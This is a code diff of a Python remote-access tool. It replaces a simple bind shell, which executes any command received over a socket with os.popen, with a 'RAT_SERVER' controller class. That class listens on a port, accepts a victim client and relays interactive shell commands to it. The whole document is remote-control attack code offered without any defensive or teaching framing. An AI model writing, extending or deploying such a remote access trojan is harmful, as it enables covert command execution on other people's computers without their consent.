@@ -1,52 +1,50 @@
-import socket
-import threading
-import os
+import socket, os
 
-def execute(cmd):
+class RAT_SERVER:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
 
-    return os.popen(cmd).read
+    def build_connection(self):
+        global client, addr, s
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind((self.host, self.port))
+        s.listen(5)
+        print("[*] Waiting for the client...")
+        client, addr = s.accept()
+        print()
+        ipcli = client.recv(1024).decode()
+        print(f"[*] Connection is established successfully with {ipcli}")
+        print()
 
-    
+    def banner(self):
+        print("banner")
+    def execute(self):
+        self.banner()
+        while True:
+            global command
+            command = input('Command >>  ')
 
-HOST = '127.0.0.1'
-PORT = 1234
-
-def listen():
-
-    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    print('listening')
-    server.bind((HOST, PORT))
-    server.listen(5)
-    while True:
-        client_socket, _ = server.accept()
-        client_thread = threading.Thread(
-            target=handle, args=(client_socket,))
-        client_thread.start()
-
-
-def handle(client_socket):
-        
-    result = ''
-    while True:
-        client_socket.send(os.popen('cd').read().encode())
-        data = client_socket.recv(4096).decode().lower()
-
-        if "q" == data.strip("\n"):
-            exit()
-        else:
-            if data.startswith("cd"):
-                if "cd" == data.strip("\n"):
-                    result = os.popen(data).read()
-                    client_socket.send(result.encode())
-                    continue
-                os.chdir(data[3:].replace('\n',''))
-            else :
-                result = os.popen(data).read()
-            result = result + "\n"
-            client_socket.send(result.encode()) 
-            result = ''
-            
+            if command == 'shell':
+                client.send(command.encode())
+                while 1:
+                    command = str(input('>> '))
+                    client.send(command.encode())
+                    if command.lower() == 'exit':
+                        break
+                    result_output = client.recv(1024).decode()
+                    print(result_output)
+                client.close()
+                s.close()
 
 
-listen()
+
+
+
+
+
+rat_server = RAT_SERVER("127.0.0.1", 12345)
+
+rat_server.build_connection()
+
+rat_server.execute()
